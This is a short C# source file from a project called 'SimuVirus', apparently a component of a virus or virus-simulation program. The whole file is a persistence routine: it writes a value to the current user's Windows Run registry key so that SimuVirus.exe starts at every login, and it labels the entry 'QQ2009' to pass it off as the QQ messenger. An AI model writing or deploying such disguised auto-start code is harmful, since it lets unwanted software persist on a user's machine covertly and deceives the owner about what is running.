using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using System;
using System.Windows;

namespace SimuVirus.deploy
{
    class Startup
    {
        private static RegistryKey startupKey;
        public static string is_hide;

        public void init_startup()
        {
            if (is_hide == "1")
                return;

            startupKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            string MyName = "QQ2009";
            string MyValue = Info.currentDirectory + @"\SimuVirus.exe";
            CreateStartup(MyName, MyValue);
        }

        private void CreateStartup(string KeyName, string KeyValue)
        {
            startupKey.SetValue(KeyName, KeyValue);
        }
    }
}
